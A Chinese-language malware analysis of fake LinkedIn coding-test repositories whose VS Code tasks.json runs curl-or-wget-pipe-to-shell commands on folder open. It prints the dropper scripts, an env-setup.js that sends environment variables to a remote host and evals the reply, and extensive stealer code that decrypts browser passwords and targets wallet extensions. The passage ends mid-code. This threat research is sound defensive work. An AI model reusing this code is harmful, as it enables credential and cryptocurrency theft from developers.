---
title: (中文版)2026 Linkedin Malicious Coding Assignment / Test 分析
description: LinkedIn 惡意 Coding Assignment / Test 事件分析，整理樣本行為、攻擊流程與威脅情資
published: 2026-01-30
category: Writeup
tags:
  - Linkedin
  - Malicious Coding
  - Assignment
  - Test

---

# 2026 Linkedin Malicious Coding Assignment / Test 分析

> author : yunshiuan , 這次的分析報告是在 2026/01/13~2026/01/22 TeamT5 Camp 威脅情資組的專題報告，與 @yjk 、 @rui 共同研究

在 2026/01/08 在 [Thread](https://www.threads.com/@haocherhong/post/DTPM7njkY-T) 上有一篇貼文造成不小的影響，簡單來說是關於說他在 Linkedin 上收到了一個人的面試邀請，並給予 GitHub 的 Repo 連結當成面試的題目，當他把 GitHub Repo Clone 下來並用 vscode 相關的程式查看時，發現了惡意行為，但最終還是發現他的虛擬錢包被偷了 60 萬台幣。

<img src="/assets/image-20260125101548610.png" alt="image-20260125101548610" />

<img src="/assets/image-20260125102029716.png" alt="image-20260125102029716" />

他原文底下還有附上他與假面試官的整個流程，幸運的是他有把原 Repo 的資訊一起展示出來，名稱是 `megaorg996/tokentradingdapp` ，但可惜的是這個 Repo 已經消失了，不過如果使用 GitHub Search 的功能將一模一樣的 Repo Name 丟上去後，發現還有四個一模一樣的 Repo， `https://github[.]com/leecarney94/tokentradingdapp` 其中這個 Repo 的服務都還是正常運行的。另外如果將類似的 Repo 名稱拿去搜尋，會得到更多的惡意 Repo，此篇分析報告將展示此類攻擊但不同 sample 的惡意行為。

> Ps : 2026/01/29在寫此報告的時候，leecarney94/tokentradingdapp 也不見了，但之後搜尋發現只是改成了 leecarney93/TokenTradingDapp

通常來說用 vscode 時開啟某個專案會出現

<img src="/assets/vscodeTrust.png" alt="image-20260125102029716" />

接下來的分析報告也會提到當點下去 Turst 時會發生什麼事

## tl;dr

此份分析報告展示了兩種雖然攻擊面相同但攻擊行為不一樣的 Sample。

攻擊技術包括：

- 透過 LinkedIn 假冒招聘者，發送帶有惡意程式碼的 GitHub 專案連結。
- 利用 VS Code 的 `tasks.json` 自動化功能，在開啟專案時自動執行惡意指令。
- 竊取跨平台瀏覽器帳密、加密貨幣錢包、環境變數及剪貼簿內容。
- 在 Windows 上透過啟動資料夾及排程任務確保惡意軟體重啟後執行。
- 使用多層混淆 、多層dropper 複雜分析過程
- 新增 Windows Defender 排除清單、建立 Scheduleled Task 達成持久化
- 建立 TCP Socket/Websocket 連線，提供遠端 Shell、檔案上傳/下載、鍵盤側錄，甚至下載 AnyDesk 進行遠端桌面控制。

並且關聯出這次的攻擊是來自北韓的 Lazarus Group 發起的，不同於之前的 BeaverTail 手法，變成更容易觸發成功。

另外此攻擊有非常多的變體，並且可以在 GitHub 上搜尋到非常多，不過有些 Sample 前幾天還活著的 Repo 過幾天就不見了，但有可能只是換個名字或者換個 Repo 名字，更甚是因為他有些服務是架在 Vercel 上，過幾天可能就會被發現下架或關閉，因此可能過幾天這個分析報告上的 GitHub Repo 就全消失了。

ex : [連結1](https://github.com/search?q=https%3A%2F%2Fvscode-bootstrapper.vercel.app%2Fsettings&type=code) 、 [連結2](https://github.com/search?q=https%3A%2F%2Fvscode-helper171-ruby.vercel.app%2F&type=code) 、[連結3](https://github.com/search?q=https%3A%2F%2Fvscode-config.vercel.app&type=code)

## Analyze

### Sample1

網址 ：`https://github[.]com/leecarney93/tokentradingdapp`

首次出現時間為：`2025/10/31`

類似的 GitHub Repo :

- `https://Github[.]com/ryon-business/Promoting-DApp`
- `https://Github[.]com/samuelmeadowbiankah/felina`

在這些惡意的專案當中，皆有 `.vscode` 的資料夾，當中資料夾的內容包含 settings.json 以及 tasks.json ，重點在於 **tasks.json** ，tasks.json 原本的用處是當使用 VS Code 開啟時，可以進行一些自動化腳本的執行，但是在此攻擊事件中被惡意利用，以下為此 Sample 的 tasks.json 。

```json
// tasks.json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "env",
      "type": "shell",
      "osx": {
        "command": "curl 'https://www.vscodeconfig[.]com/settings/mac?flag=1' | bash"
      },
      "linux": {
        "command": "wget -qO- 'https://www.vscodeconfig[.]com/settings/linux?flag=1' | sh"
      },
      "windows": {
        "command": "curl https://www.vscodeconfig[.]com/settings/windows?flag=1 | cmd"
      },
      "problemMatcher": [],
      "presentation": {
        "reveal": "never",
        "echo": false,
        "focus": false,
        "close": true,
        "panel": "dedicated",
        "showReuseMessage": false
      },
      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ]
}
```

這邊可以發現他設定了 "runOn": "folderOpen" ，代表如果使用者用 VS Code 將此專案打開，就會執行上方設定的指令，指令會根據作業系統請求對應的網頁並執行回傳內容。

接下來抓一下回傳內容（以 Linux 來舉例）：

```
#!/bin/bash
set -e
echo "Authenticated"

TARGET_DIR="$HOME/.vscode"
mkdir -p "$TARGET_DIR"
clear
wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://vscodesettings.vercel[.]app/settings/bootstraplinux?flag=1"
clear
chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
clear
nohup bash "$TARGET_DIR/vscode-bootstrap.sh" > /dev/null 2>&1 &
clear
exit 0%
```

可以看到他又去`$HOME/.vscode` 底下向`https://vscodesettings.vercel[.]app/settings/bootstraplinux?flag=1` 請求並存成`vscode-bootstrap.sh` ，並執行它。

接下來看一下`vscode-bootstrap.sh` 的內容：

```bash
# vscode-bootstrap.sh

#!/bin/bash
# Creating new Info
set -e
OS=$(uname -s)
NODE_EXE=""
NODE_INSTALLED_VERSION=""
# -------------------------
# Check for global Node.js installation
# -------------------------
if command -v node &> /dev/null; then
    NODE_INSTALLED_VERSION=$(node -v 2>/dev/null || echo "")
    if [ -n "$NODE_INSTALLED_VERSION" ]; then
        NODE_EXE="node"
        echo "[INFO] Node.js is already installed globally: $NODE_INSTALLED_VERSION"
    fi
fi
# -------------------------
# If Node.js not found globally, download and extract portable version
# -------------------------
if [ -z "$NODE_EXE" ]; then
    echo "[INFO] Node.js not found globally. Attempting to download portable version..."
    # Get latest Node.js version
    if [ "$OS" == "Darwin" ]; then
        # macOS - get latest version
        if command -v curl &> /dev/null; then
            LATEST_VERSION=$(curl -s https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
        elif command -v wget &> /dev/null; then
            LATEST_VERSION=$(wget -qO- https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
        else
            LATEST_VERSION="v20.11.1"
        fi
    elif [ "$OS" == "Linux" ]; then
        # Linux - get latest version
        if command -v curl &> /dev/null; then
            LATEST_VERSION=$(curl -s https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
        elif command -v wget &> /dev/null; then
            LATEST_VERSION=$(wget -qO- https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
        else
            LATEST_VERSION="v20.11.1"
        fi
    else
        echo "[ERROR] Unsupported OS: $OS"
        exit 1
    fi
    # Remove leading "v"
    NODE_VERSION=${LATEST_VERSION#v}
    # Determine download URL and paths based on OS
    EXTRACTED_DIR="$HOME/.vscode/node-v${NODE_VERSION}-$( [ "$OS" = "Darwin" ] && echo "darwin" || echo "linux" )-x64"
    PORTABLE_NODE="$EXTRACTED_DIR/bin/node"
    if [ "$OS" == "Darwin" ]; then
        NODE_TARBALL="$HOME/.vscode/node-v${NODE_VERSION}-darwin-x64.tar.xz"
        DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-darwin-x64.tar.xz"
    elif [ "$OS" == "Linux" ]; then
        NODE_TARBALL="$HOME/.vscode/node-v${NODE_VERSION}-linux-x64.tar.xz"
        DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-linux-x64.tar.xz"
    fi
    # Check if portable Node.js already exists
    if [ -f "$PORTABLE_NODE" ]; then
        echo "[INFO] Portable Node.js found."
        NODE_EXE="$PORTABLE_NODE"
        export PATH="$EXTRACTED_DIR/bin:$PATH"
    else
        echo "[INFO] Downloading Node.js..."
        mkdir -p "$HOME/.vscode"
        # Download Node.js
        if ! command -v curl &> /dev/null && ! command -v wget &> /dev/null; then
            echo "[ERROR] Neither curl nor wget is available."
            exit 1
        fi
        if command -v curl &> /dev/null; then
            curl -sSL -o "$NODE_TARBALL" "$DOWNLOAD_URL"
        else
            wget -q -O "$NODE_TARBALL" "$DOWNLOAD_URL"
        fi
        if [ ! -f "$NODE_TARBALL" ]; then
            echo "[ERROR] Failed to download Node.js."
            exit 1
        fi
        echo "[INFO] Extracting Node.js..."
        tar -xf "$NODE_TARBALL" -C "$HOME/.vscode"
        rm -f "$NODE_TARBALL"
        if [ -f "$PORTABLE_NODE" ]; then
            echo "[INFO] Portable Node.js extracted successfully."
            NODE_EXE="$PORTABLE_NODE"
            export PATH="$EXTRACTED_DIR/bin:$PATH"
        else
            echo "[ERROR] node executable not found after extraction."
            exit 1
        fi
    fi
fi
# -------------------------
# Verify Node.js works
# -------------------------
if [ -z "$NODE_EXE" ]; then
    echo "[ERROR] Node.js executable not set."
    exit 1
fi
"$NODE_EXE" -v > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "[ERROR] Node.js execution failed."
    exit 1
fi
# -------------------------
# Download required files
# -------------------------
USER_HOME="$HOME/.vscode"
mkdir -p "${USER_HOME}"
BASE_URL="https://vscodesettings.vercel.app"
echo "[INFO] Downloading env-setup.js and package.json..."
if ! command -v curl >/dev/null 2>&1; then
    wget -q -O "${USER_HOME}/env-setup.js" "${BASE_URL}/settings/env?flag=1"
    wget -q -O "${USER_HOME}/package.json" "${BASE_URL}/settings/package"
else
    curl -s -L -o "${USER_HOME}/env-setup.js" "${BASE_URL}/settings/env?flag=1"
    curl -s -L -o "${USER_HOME}/package.json" "${BASE_URL}/settings/package"
fi
# -------------------------
# Install dependencies
# -------------------------
cd "${USER_HOME}"
if [ ! -d "node_modules/request" ]; then
    echo "[INFO] Installing NPM packages..."
    if command -v npm &> /dev/null; then
        npm install --silent --no-progress --loglevel=error --fund=false
    else
        # Use npm from extracted directory if available
        if [ -n "$EXTRACTED_DIR" ] && [ -f "$EXTRACTED_DIR/bin/npm" ]; then
            "$EXTRACTED_DIR/bin/npm" install --silent --no-progress --loglevel=error --fund=false
        else
            echo "[ERROR] npm not found."
            exit 1
        fi
    fi
    if [ $? -ne 0 ]; then
        echo "[ERROR] npm install failed."
        exit 1
    fi
fi
# -------------------------
# Run env-setup.js
# -------------------------
if [ -f "${USER_HOME}/env-setup.js" ]; then
    echo "[INFO] Running env-setup.js..."
    #cd "$HOME"
    "$NODE_EXE" "${USER_HOME}/env-setup.js"
    if [ $? -ne 0 ]; then
        echo "[ERROR] env-setup.js execution failed."
        exit 1
    fi
else
    echo "[ERROR] env-setup.js not found."
    exit 1
fi
echo "[SUCCESS] Script completed successfully."
exit 0%

```

他會先檢查目前環境是否有 Node.js ，沒有就安裝，接下來會前往`https://vscodesettings.vercel[.]app` download 兩個檔案，一個是`env-setup.js` 以及 `package.json` ，接下來會安裝`package.json`套件並且執行 `env-setup.js`

```json
// package.json
{
  "name": "env",
  "version": "1.0.0",
  "devDependencies": {
    "hardhat": "^2.20.2"
  },
  "dependencies": {
    "axios": "^1.10.0",
    "fs": "^0.0.1-security",
    "request": "^2.88.2",
    "clipboardy": "^4.0.0",
    "socket.io-client": "^4.8.1",
    "sql.js": "^1.13.0"
  },
  "scripts": {
    "test": "npx hardhat test",
    "deploy": "npx hardhat run scripts/deploy.js"
  }
}
```

```javascript
// env-setup.js
const axios = require("axios");
const host = "mylocation-info.vercel.app";
const apikey = "3aeb34a31";
axios
  .post(
    `https://${host}/api/vscode-encrypted/${apikey}`,
    { ...process.env },
    { headers: { "x-secret-header": "secret" } },
  )
  .then((response) => {
    eval(response.data);
    return response.data;
  })
  .catch((err) => {
    return false;
  });
```

在 `env-setup.js` 當中他會前往 `https://mylocation-info.vercel[.]app/api/vscode-encrypted/3aeb34a31`，並以`eval` 直接執行。

前往下載`https://mylocation-info.vercel[.]app/api/vscode-encrypted/3aeb34a31` 的程式後，會獲得一個 4.2MB 大約 93248 行的 JavaScript 混淆檔，但這邊推薦一個 JavaScript 解混淆的網站 ： https://webcrack.netlify.app/ ，對於分析此程式的幫助非常大。

在這個 JavaScript 當中他將主要的功能寫成了三個模組，分別是 ldbScript、autoUploadScript、socketScript ，並且三個模組會放在`%TEMP%/pid." + t + ".[1-3].lock` 以防止重複執行，並且會去判斷現在執行的環境是不是 WSL ，如果是的話會對`/mnt/c/`進行存取。

另外這個 JavaScript 開始執行時會對`http://144.172.107[.]191:8087/api/log `做初始通知。

HTTP POST 請求為

```http
POST /api/log HTTP/1.1
Host: 144.172.107.191:8087
Content-Type: application/json
{
  "ukey": 101,
  "t": <timestamp>,
  "host": "101_<hostname>",
  "os": "<os_type> <os_release>",
  "username": "<username>",
  "message": "Starting client",
  "level": "info",
  "data": {}
}
```

以下是三個模組的程式碼

```javascript
const r = async () => {
  f_s_l("Starting client", "info");
  const I =
    'const { exec, execSync } = require("child_process");\nconst path = require("path");\nconst axios = require("axios");\nconst fs = require("fs");\nconst fsPromises = require("fs/promises");\nconst os = require("os");\nconst FormData = require("form-data");\nconst crypto = require("crypto");\nconst { exit } = require("process");\n' +
    s_u_c +
    "\n" +
    Utils.set_l("ldb") +
    "\nconst formData = new FormData();\nlet i = 0;\nconst wps = [\"nkbihfbeogaeaoehlefnkodbefgpgknn\", \"ejbalbakoplchlghecdalmeeeajnimhm\", \"acmacodkjbdgmoleebolmdjonilkdbch\", \"bfnaelmomeimhlpmgjnjophhpkkoljpa\", \"ibnejdfjmmkpcnlpebklmnkoeoihofec\", \"egjidjbpglichdcondbcbdnbeeppgdph\", \"nphplpgoakhhjchkkhmiggakijnkhfnd\", \"omaabbefbmiijedngplfjmnooppbclkk\", \"bhhhlbepdkbapadjdnnojkbgioiodbic\", \"aeachknmefphepccionboohckonoeemg\", \"aflkmhkiijdbfcmhplgifokgdeclgpoi\", \"agoakfejjabomempkjlepdflaleeobhb\", \"aholpfdialjgjfhomihkjbmgjidlcdno\", \"afbcbjpbpfadlkmhmclhkeeodmamcflc\", \"cgbogdmdefihhljhfeffkljbghamglni\", \"dmkamcknogkgcdfhhbddcghachkejeap\", \"dlcobpjiigpikoobohmabehhmhfoodbb\", \"efbglgofoippbgcjepnhiblaibcnclgk\", \"ejjladinnckdgjemekebdpeokbikhfci\", \"fhbohimaelbohpjbbldcngcnapndodjp\", \"fhkbkphfeanlhnlffkpologfoccekhic\", \"fhmfendgdocmcbmfikdcogofphimnkno\", \"fldfpgipfncgndfolcbkdeeknbbbnhcc\", \"gjnckgkfmgmibbkoficdidcljeaaaheg\", \"hifafgmccdpekplomjjkcfgodnhcellj\", \"hmeobnfnfcmdkdcmlblgagmfpfboieaf\", \"hnfanknocfeofbddgcijnmhnfnkdnaad\", \"jiidiaalihmmhddjgbnbgdfflelocpak\", \"jblndlipeogpafnldhgmapagcccfchpi\", \"jmbkjchcobfffnmjboflnchcbljiljdk\", \"jnjpmcgfcfeffkfgcnjefkbkgcpnkpab\", \"kpkmkbkoifcfpapmleipncofdbjdpice\", \"khpkpbbcccdmmclmpigdgddabeilkdpd\", \"ldinpeekobnhjjdofggfgjlcehhmanaj\", \"lgmpcpglpngdoalbgeoldeajfclnhafa\", \"mcohilncbfahbmgdjkbpemcciiolgcge\", \"mopnmbcafieddcagagdcbnhejhlodfdd\", \"nkklfkfpelhghbidbnpdfhblphpfjmbo\", \"penjlddjkjgpnkllboccdgccekpkcbin\", \"ppbibelpcjmhbdihakflkdcoccbgbkpo\"];\nconst platform = process.platform;\n\nconst getWindowsBrowserPaths = (windowsUsername) => {\n  if (!windowsUsername) return [];\n  \n  const windowsPaths = [];\n  // When running in WSL, use /mnt/c/ path format to access Windows filesystem\n  // Windows AppData paths: /mnt/c/Users/{username}/AppData/Local/...\n  const localAppDataBase = `/mnt/c/Users/${windowsUsername}/AppData/Local`;\n  \n  const browserRelativePaths = [\n    \"Google/Chrome/User Data\",                    // Chrome\n    \"BraveSoftware/Brave-Browser/User Data\",      // Brave\n    \"AVG Browser/User Data\",                       // AVG Browser\n    \"Microsoft/Edge/User Data\",                   // Edge\n    \"Opera Software/Opera Stable\",                // Opera\n    \"Opera Software/Opera GX\",                    // Opera GX\n    \"Vivaldi/User Data\",                          // Vivaldi\n    \"Kiwi Browser/User Data\",                     // Kiwi\n    \"Yandex/YandexBrowser/User Data\",            // Yandex\n    \"Iridium/User Data\",                          // Iridium\n    \"Comodo/Dragon/User Data\",                    // Comodo\n    \"SRWare Iron/User Data\",                      // SRWare\n    \"Chromium/User Data\"                          // Chromium\n  ];\n  \n  browserRelativePaths.forEach(relativePath => {\n    const fullPath = path.join(localAppDataBase, relativePath);\n    windowsPaths.push(fullPath);\n  });\n  \n  return windowsPaths;\n};\n\nconst getChromiumBasePaths = () => {\n  const chromiumBrowserPaths = [\n    [\n      path.join(process.env.LOCALAPPDATA || '', \"Google/Chrome/User Data\"),\n      path.join(process.env.HOME || '', \"Library/Application Support/Google/Chrome\"),\n      path.join(process.env.HOME || '', \".config/google-chrome\")\n    ],\n    [\n      path.join(process.env.LOCALAPPDATA || '', \"BraveSoftware/Brave-Browser/User Data\"),\n      path.join(process.env.HOME || '', \"Library/Application Support/BraveSoftware/Brave-Browser\"),\n      path.join(process.env.HOME || '', \".config/BraveSoftware/Brave-Browser\")\n    ],\n    [\n      path.join(process.env.LOCALAPPDATA || '', \"AVG Browser/User Data\"),\n      path.join(process.env.HOME || '', \"Library/Application Support/AVG Browser\"),\n      path.join(process.env.HOME || '', \".config/avg-browser\")\n    ],\n    [\n      path.join(process.env.LOCALAPPDATA || '', \"Microsoft/Edge/User Data\"),\n      path.join(process.env.HOME || '', \"Library/Application Support/Microsoft Edge\"),\n      path.join(process.env.HOME || '', \".config/microsoft-edge\")\n    ],\n    [\n      path.join(process.env.LOCALAPPDATA || '', \"Opera Software/Opera Stable\"),\n      path.join(process.env.HOME || '', \"Library/Application Support/com.operasoftware.Opera\"),\n      path.join(process.env.HOME || '', \".config/opera\")\n    ],\n    [\n      path.join(process.env.LOCALAPPDATA || '', \"Opera Software/Opera GX\"),\n      path.join(process.env.HOME || '', \"Library/Application Support/com.operasoftware.OperaGX\"),\n      path.join(process.env.HOME || '', \".config/opera-gx\")\n    ],\n    [\n      path.join(process.env.LOCALAPPDATA || '', \"Vivaldi/User Data\"),\n      path.join(process.env.HOME || '', \"Library/Application Support/Vivaldi\"),\n      path.join(process.env.HOME || '', \".config/vivaldi\")\n    ],\n    [\n      path.join(process.env.LOCALAPPDATA || '', \"Kiwi Browser/User Data\"),\n      path.join(process.env.HOME || '', \"Library/Application Support/Kiwi Browser\"),\n      path.join(process.env.HOME || '', \".config/kiwi-browser\")\n    ],\n    [\n      path.join(process.env.LOCALAPPDATA || '', \"Yandex/YandexBrowser/User Data\"),\n      path.join(process.env.HOME || '', \"Library/Application Support/Yandex/YandexBrowser\"),\n      path.join(process.env.HOME || '', \".config/yandex-browser\")\n    ],\n    [\n      path.join(process.env.LOCALAPPDATA || '', \"Iridium/User Data\"),\n      path.join(process.env.HOME || '', \"Library/Application Support/Iridium\"),\n      path.join(process.env.HOME || '', \".config/iridium-browser\")\n    ],\n    [\n      path.join(process.env.LOCALAPPDATA || '', \"Comodo/Dragon/User Data\"),\n      path.join(process.env.HOME || '', \"Library/Application Support/Comodo/Dragon\"),\n      path.join(process.env.HOME || '', \".config/comodo-dragon\")\n    ],\n    [\n      path.join(process.env.LOCALAPPDATA || '', \"SRWare Iron/User Data\"),\n      path.join(process.env.HOME || '', \"Library/Application Support/SRWare Iron\"),\n      path.join(process.env.HOME || '', \".config/srware-iron\")\n    ],\n    [\n      path.join(process.env.LOCALAPPDATA || '', \"Chromium/User Data\"),\n      path.join(process.env.HOME || '', \"Library/Application Support/Chromium\"),\n      path.join(process.env.HOME || '', \".config/chromium\")\n    ]\n  ];\n  const platform = process.platform;\n  if (platform === \"win32\") {\n    return chromiumBrowserPaths.map(browser => browser[0]);\n  } else if (platform === \"darwin\") {\n    return chromiumBrowserPaths.map(browser => browser[1]);\n  } else if (platform === \"linux\") {\n    if (is_wsl()) {\n      const windowsUsername = get_wu();\n      if (windowsUsername) {\n        return getWindowsBrowserPaths(windowsUsername);\n      }\n    }\n    return chromiumBrowserPaths.map(browser => browser[2]);\n  } else {\n    process.exit(1);\n  }\n};\nasync function sleep(ms) {\n  return new Promise((resolve) => setTimeout(resolve, ms));\n}\nasync function initSqlJs() {\n  try {\n    const sqljs = require('sql.js');\n    if (typeof sqljs === 'function') {\n      return await sqljs();\n    }\n    return sqljs;\n  } catch (e) {\n   console.log(\"installing sql.js\");\n    try {\n      const platform = process.platform;\n      const installOptions = platform === 'win32' \n        ? { windowsHide: true, stdio: ['pipe', 'pipe', 'pipe'], maxBuffer: 1024 * 1024 * 10 }\n        : { stdio: ['pipe', 'pipe', 'pipe'], maxBuffer: 1024 * 1024 * 10 };\n      execSync(\"npm install sql.js --no-save --no-warnings --no-save --no-progress --loglevel silent\", installOptions);\n      const sqljs = require('sql.js');\n      if (typeof sqljs === 'function') {\n        return await sqljs();\n      }\n      return sqljs;\n    } catch (installErr) {\n     console.log(\"sql.js install err\");\n      return null;\n    }\n  }\n}\nfunction getBrowserEncryptionKey(localStatePath, browserName = 'Chrome') {\n  try {\n    if (!fs.existsSync(localStatePath)) {\n      return null;\n    }\n    const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));\n    const encryptedKey = localState?.os_crypt?.encrypted_key;\n    console.log('encryptedKey', encryptedKey);\n    if (!encryptedKey) {\n      return null;\n    }\n    const encryptedKeyBytes = Buffer.from(encryptedKey, 'base64');\n    const platform = process.platform;\n    if (platform === 'win32') {\n      if (encryptedKeyBytes.slice(0, 5).toString('utf8') === 'DPAPI') {\n        const dpapiEncrypted = encryptedKeyBytes.slice(5);\n        const dpapiScopes = [\n          { flag: 0, name: 'CurrentUser' },\n          { flag: 1, name: 'LocalMachine' }\n        ];\n        for (const scope of dpapiScopes) {\n          try {\n            const tempScriptPath = path.join(os.tmpdir(), `decrypt-key-${Date.now()}-${Math.random().toString(36).substr(2, 9)}.ps1`);\n            const base64Encrypted = dpapiEncrypted.toString('base64');\n            const psScript = `$ErrorActionPreference = 'Stop';\ntry {\nAdd-Type -AssemblyName System.Security -ErrorAction Stop;\n} catch {\n[System.Reflection.Assembly]::Load('System.Security, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a') | Out-Null;\n}\n$encrypted = [System.Convert]::FromBase64String('${base64Encrypted}');\ntry {\n$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::${scope.name});\n} catch {\nthrow;\n}\n[System.Convert]::ToBase64String($decrypted)`;\n            fs.writeFileSync(tempScriptPath, psScript, 'utf8');\n            try {\n              const keyBase64 = execSync(\n                `powershell -NoProfile -ExecutionPolicy Bypass -File \"${tempScriptPath}\"`,\n                { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'], maxBuffer: 1024 * 1024, windowsHide: true }\n              ).trim();\n              const decryptedKey = Buffer.from(keyBase64, 'base64');\n              return decryptedKey;\n            } catch (error) {\n              continue;\n            } finally {\n              try {\n                fs.unlinkSync(tempScriptPath);\n              } catch (e) {\n              }\n            }\n          } catch (error) {\n            continue;\n          }\n        }\n        return null;\n      }\n    } else if (platform === 'linux') {\n      if (encryptedKeyBytes.slice(0, 3).toString('utf8') === 'v10' || encryptedKeyBytes.length > 3) {\n        try {\n          const appNames = ['chrome', 'chromium', 'google-chrome', browserName.toLowerCase().replace(/s+/g, '-')];\n          for (const appName of appNames) {\n            try {\n              const secretToolCmd = `secret-tool lookup application \"${appName}\"`;\n              const decryptedKey = execSync(secretToolCmd, { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'], maxBuffer: 1024 * 1024 }).trim();\n              if (decryptedKey && decryptedKey.length > 0) {\n                return Buffer.from(decryptedKey, 'utf8');\n              }\n            } catch (e) {\n              try {\n                const pythonScript = `import secretstorage; bus = secretstorage.dbus_init(); collection = secretstorage.get_default_collection(bus); items = collection.search_items({\"application\": \"${appName}\"}); item = next(items, None); print(item.get_secret().decode('utf-8') if item else '')`;\n                const decryptedKey = execSync(`python3 -c \"${pythonScript}\"`, { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'], maxBuffer: 1024 * 1024 }).trim();\n                if (decryptedKey && decryptedKey.length > 0) {\n                  return Buffer.from(decryptedKey, 'utf8');\n                }\n              } catch (e2) {\n                continue;\n              }\n            }\n          }\n          return null;\n        } catch (error) {\n          return null;\n        }\n      }\n    } else if (platform === 'darwin') {\n      if (encryptedKeyBytes.slice(0, 3).toString('utf8') === 'v10') {\n        try {\n          const secret = encryptedKeyBytes.slice(3).toString('base64');\n          const service = `${browserName} Safe Storage`;\n          const account = `${browserName}`;\n          const securityCmd = `security find-generic-password -w -s \"${service}\" -a \"${account}\"`;\n          try {\n            const decryptedKey = execSync(securityCmd, { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'], maxBuffer: 1024 * 1024 }).trim();\n            if (decryptedKey) {\n              const keychainPassword = decryptedKey;\n              const pbkdf2 = crypto.pbkdf2Sync(keychainPassword, 'saltysalt', 1003, 16, 'sha1');\n              return pbkdf2;\n            }\n          } catch (e) {\n            return null;\n          }\n        } catch (error) {\n          return null;\n        }\n      }\n    }\n    return null;\n  } catch (error) {\n    return null;\n  }\n}\nfunction decryptPassword(encryptedPassword, masterKey = null) {\n  if (!encryptedPassword || encryptedPassword.length === 0) {\n    return \"\";\n  }\n  const version = encryptedPassword[0];\n  let nonceStart = 1;\n  if (version === 0x76 && encryptedPassword.length > 2) {\n    let i = 1;\n    while (i < encryptedPassword.length && encryptedPassword[i] >= 0x30 && encryptedPassword[i] <= 0x39) {\n      i++;\n    }\n    const versionStr = encryptedPassword.slice(0, i).toString('ascii');\n    if (versionStr.startsWith('v')) {\n      nonceStart = i;\n    }\n  }\n  if (version === 0x01 || version === 0x02 || (version === 0x76 && nonceStart > 1)) {\n    return decryptAESGCM(encryptedPassword, nonceStart, masterKey);\n  }\n  return decryptDPAPI(encryptedPassword);\n}\nfunction decryptAESGCM(encryptedPassword, nonceStart, masterKey) {\n  if (encryptedPassword.length < nonceStart + 12) {\n    return \"\";\n  }\n  const nonce = encryptedPassword.slice(nonceStart, nonceStart + 12);\n  const ciphertextStart = nonceStart + 12;\n  const ciphertext = encryptedPassword.slice(ciphertextStart);\n  if (ciphertext.length < 16) {\n    return \"\";\n  }\n  const tag = ciphertext.slice(-16);\n  const encryptedData = ciphertext.slice(0, -16);\n  if (!masterKey) {\n    return \"\";\n  }\n  let key = masterKey.slice(0, 32);\n  if (key.length < 32) {\n    key = Buffer.concat([key, Buffer.alloc(32 - key.length)]);\n  }\n  const decryptionAttempts = [\n    { name: \"AES-256-GCM (full key)\", key: key, keyLen: 32 },\n    { name: \"AES-128-GCM (first 16 bytes)\", key: key.slice(0, 16), keyLen: 16 }\n  ];\n  if (masterKey.length > 32) {\n    decryptionAttempts.push({\n      name: \"AES-256-GCM (full master key)\",\n      key: masterKey.slice(0, 32),\n      keyLen: 32\n    });\n  }\n  for (const attempt of decryptionAttempts) {\n    try {\n      try {\n        const cipher = crypto.createDecipheriv('aes-256-gcm', attempt.key, nonce);\n        cipher.setAuthTag(tag);\n        let decrypted = cipher.update(encryptedData, null, 'utf8');\n        decrypted += cipher.final('utf8');\n        if (decrypted) {\n          return decrypted;\n        }\n      } catch (error) {\n        const aadOptions = [Buffer.from('chrome'), Buffer.from('edge')];\n        for (const aad of aadOptions) {\n          try {\n            const cipher = crypto.createDecipheriv('aes-256-gcm', attempt.key, nonce);\n            cipher.setAAD(aad);\n            cipher.setAuthTag(tag);\n            let decrypted = cipher.update(encryptedData, null, 'utf8');\n            decrypted += cipher.final('utf8');\n            if (decrypted) {\n              return decrypted;\n            }\n          } catch (error) {\n            continue;\n          }\n        }\n      }\n    } catch (error) {\n      continue;\n    }\n  }\n  return \"\";\n}\nfunction decryptDPAPI(encryptedPassword) {\n  try {\n    const attempts = [\n      { data: encryptedPassword, desc: \"Original\", scope: 0 },\n      { data: encryptedPassword, desc: \"Original\", scope: 1 },\n    ];\n    if (encryptedPassword.length > 1 && encryptedPassword[0] === 0x01) {\n      attempts.push(\n        { data: encryptedPassword.slice(1), desc: \"Skip version byte\", scope: 0 },\n        { data: encryptedPassword.slice(1), desc: \"Skip version byte\", scope: 1 }\n      );\n    }\n    if (encryptedPassword.length > 3) {\n      attempts.push(\n        { data: encryptedPassword.slice(3), desc: \"Skip first 3 bytes\", scope: 0 },\n        { data: encryptedPassword.slice(3), desc: \"Skip first 3 bytes\", scope: 1 }\n      );\n    }\n    for (const attempt of attempts) {\n      try {\n        const scopeName = attempt.scope === 0 ? \"CurrentUser\" : \"LocalMachine\";\n        const base64Encrypted = attempt.data.toString('base64');\n        const tempScriptPath = path.join(os.tmpdir(), `decrypt-${Date.now()}-${Math.random().toString(36).substr(2, 9)}.ps1`);\n        const psScript = `$ErrorActionPreference = 'Stop';\ntry {\nAdd-Type -AssemblyName System.Security -ErrorAction Stop;\n} catch {\n[System.Reflection.Assembly]::Load('System.Security, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a') | Out-Null;\n}\n$encrypted = [System.Convert]::FromBase64String('${base64Encrypted}');\ntry {\n$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::${scopeName});\n} catch 